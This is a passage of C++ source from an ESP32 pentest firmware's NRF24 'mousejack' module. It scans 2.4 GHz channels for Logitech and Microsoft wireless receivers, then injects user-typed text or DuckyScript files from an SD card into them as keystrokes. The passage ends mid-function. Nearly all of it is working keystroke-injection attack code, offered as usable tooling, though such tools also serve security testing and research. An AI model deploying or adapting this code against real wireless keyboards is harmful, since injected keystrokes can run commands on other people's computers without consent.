viniciushnf/ESP32-S3-Bruce-ST7735-1.8/bruce-firmware/src/modules/NRF24/nrf_mousejack.cpp
    mj_drawScanScreen(0, true);

    uint8_t lastDrawnCount = 0;
    unsigned long lastRefresh = 0;
    bool scanning = true;

    while (scanning) {
        // Sweep channels 2-84 (ESB range)
        for (uint8_t ch = 2; ch <= 84 && scanning; ch++) {
            if (check(EscPress)) {
                scanning = false;
                break;
            }

            NRFradio.setChannel(ch);
            NRFradio.startListening();

            for (int tries = 0; tries < SCAN_TRIES_PER_CH; tries++) {
                delayMicroseconds(SCAN_DWELL_US);

                if (NRFradio.available()) {
                    uint8_t rxBuf[32];
                    NRFradio.read(rxBuf, sizeof(rxBuf));
                    mj_fingerprint(rxBuf, 32, ch);
                }
            }

            NRFradio.stopListening();

            // Refresh display periodically
            if (millis() - lastRefresh > 200 || mj_targetCount != lastDrawnCount) {
                mj_drawScanScreen(ch, false);
                lastDrawnCount = mj_targetCount;
                lastRefresh = millis();
            }
        }
    }

    NRFradio.stopListening();
    NRFradio.powerDown();
    return (mj_targetCount > 0);
}

// ══════════════════════════════════════════════════════════════════
// ═══════════════ ATTACK EXECUTION ══════════════════════════════
// ══════════════════════════════════════════════════════════════════

static void mj_setupTxForTarget(const MjTarget &target) {
    NRFradio.stopListening();
    NRFradio.setAutoAck(false);
    NRFradio.setDataRate(RF24_2MBPS);
    NRFradio.setPALevel(RF24_PA_MAX);
    NRFradio.setAddressWidth(5);
    NRFradio.setChannel(target.channel);
    NRFradio.setRetries(0, 0);
    NRFradio.flush_rx();
    NRFradio.flush_tx();

    uint8_t addr[5];
    memcpy(addr, target.address, 5);
    NRFradio.openWritingPipe(addr);

    // Set payload size based on device type
    if (target.type == MJ_DEVICE_MICROSOFT || target.type == MJ_DEVICE_MS_CRYPT) {
        NRFradio.setPayloadSize(19);
    } else {
        NRFradio.setPayloadSize(10);
    }
}

// ── Attack: Inject String ───────────────────────────────────────
static void mj_attackString(int targetIndex) {
    const MjTarget &target = mj_targets[targetIndex];

    // Get string from user via keyboard
    String text = keyboard("", 200, "Inject text:");
    if (text.length() == 0) return;

    drawMainBorderWithTitle("INJECTING");
    tft.setTextSize(FP);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    int cy = tftHeight * 0.35;
    tft.drawCentreString(
        "[" + String(mj_getTypeLabel(target.type)) + "] " + mj_formatAddr(target), tftWidth / 2, cy, 1
    );
    cy += 16;
    tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
    tft.drawCentreString("Sending keystrokes...", tftWidth / 2, cy, 1);
    cy += 16;

    // Show first 30 chars of the text
    String preview = text.substring(0, 30);
    if (text.length() > 30) preview += "...";
    tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
    tft.drawCentreString(preview, tftWidth / 2, cy, 1);

    if (!mj_validateNrfMode()) return;

    if (!nrf_start(mj_nrfMode)) {
        displayError("NRF24 not found", true);
        return;
    }

    mj_setupTxForTarget(target);
    mj_logitechWake(target);

    // Sync sequence for Microsoft
    if (target.type == MJ_DEVICE_MICROSOFT || target.type == MJ_DEVICE_MS_CRYPT) {
        mj_msSequence = 0;
        for (int i = 0; i < 6; i++) {
            mj_msTransmit(target, 0, 0);
            delay(2);
        }
    }

    mj_typeString(target, text.c_str());

    NRFradio.powerDown();
    displaySuccess("Injection complete", true);
}

// ── Attack: DuckyScript from SD Card ────────────────────────────
static void mj_attackDucky(int targetIndex) {
    const MjTarget &target = mj_targets[targetIndex];

    // File browser
    FS *fs = nullptr;
    if (!getFsStorage(fs)) {
        displayError("No storage found");
        delay(500);
        return;
    }
    String filepath = loopSD(*fs, true, ".txt");
    if (filepath.length() == 0) return;

    drawMainBorderWithTitle("DUCKYSCRIPT");
    tft.setTextSize(FP);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    int cy = tftHeight * 0.35;
    tft.drawCentreString(
        "[" + String(mj_getTypeLabel(target.type)) + "] " + mj_formatAddr(target), tftWidth / 2, cy, 1
    );
    cy += 16;
    tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
    tft.drawCentreString("Running script...", tftWidth / 2, cy, 1);
    cy += 16;

    // Show filename
    int lastSlash = filepath.lastIndexOf('/');
    String fname = (lastSlash >= 0) ? filepath.substring(lastSlash + 1) : filepath;
    tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
    tft.drawCentreString(fname, tftWidth / 2, cy, 1);

    if (!mj_validateNrfMode()) return;

    File file = fs->open(filepath, FILE_READ);
    if (!file) {
        displayError("Cannot open file", true);
        return;
    }

    if (!nrf_start(mj_nrfMode)) {
        file.close();
        displayError("NRF24 not found", true);
        return;
    }

    mj_setupTxForTarget(target);
    mj_logitechWake(target);

    // Sync sequence for Microsoft
    if (target.type == MJ_DEVICE_MICROSOFT || target.type == MJ_DEVICE_MS_CRYPT) {
        mj_msSequence = 0;
        for (int i = 0; i < 6; i++) {
            mj_msTransmit(target, 0, 0);
            delay(2);
        }
    }

    uint16_t defaultDelayMs = 0;
    String lastLine;

    while (file.available()) {
        if (check(EscPress)) break;

        String line = file.readStringUntil('\n');
        line.trim();
        if (line.length() == 0) continue;

        // DEFAULT_DELAY
        if (line.startsWith("DEFAULT_DELAY ") || line.startsWith("DEFAULTDELAY ")) {
            defaultDelayMs = (uint16_t)line.substring(line.indexOf(' ') + 1).toInt();
            if (defaultDelayMs > 10000) defaultDelayMs = 10000;
            continue;
        }

        // REPEAT
        if (line.startsWith("REPEAT ")) {
            int reps = line.substring(7).toInt();
            if (reps < 1) reps = 1;
            if (reps > 500) reps = 500;
            for (int r = 0; r < reps; r++) {
                if (check(EscPress)) break;
                if (lastLine.length() > 0) { mj_parseDuckyLine(lastLine, target); }
            }
            continue;
        }

